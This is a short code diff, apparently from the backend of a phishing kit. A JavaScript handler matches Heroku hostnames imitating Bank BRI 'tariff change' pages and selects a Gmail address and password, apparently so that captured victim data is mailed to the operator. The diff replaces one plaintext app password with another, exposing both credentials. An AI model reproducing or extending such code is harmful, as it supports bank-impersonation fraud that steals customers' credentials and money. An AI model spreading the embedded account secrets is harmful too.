@@ -16,7 +16,7 @@ export default function handler(req, res) {
    if (url == 'pilihan-tarif-bank-bri.herokuapp.com'){
 
        email = 'linkgoggle500@gmail.com'
-       pass = 'dapwydphkoqywtiw'
+       pass = 'rcvvtbhldziblmgq'
     }else
     
     if(url == 'perubahantarifbri.herokuapp.com') //jika url sama dengan url hosting
